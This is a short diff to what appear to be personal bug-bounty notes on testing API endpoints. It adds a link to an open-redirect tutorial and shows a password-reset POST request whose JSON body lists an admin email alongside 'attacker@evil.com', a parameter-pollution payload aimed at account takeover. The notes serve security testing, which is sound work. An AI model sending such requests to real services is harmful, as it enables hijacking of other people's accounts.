@@ -1,5 +1,7 @@
 My methodology for testing API endpoints:
 Chrome > F12 > network tab > and signup/login to my account.
+Open Url Redirects & exploiting them by :
+***https://www.bugbountynotes.com/training/tutorial?id=1***
 
 POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1
 with body like {"email_address":["admin@breadcrumb.com","attacker@evil.com"]}
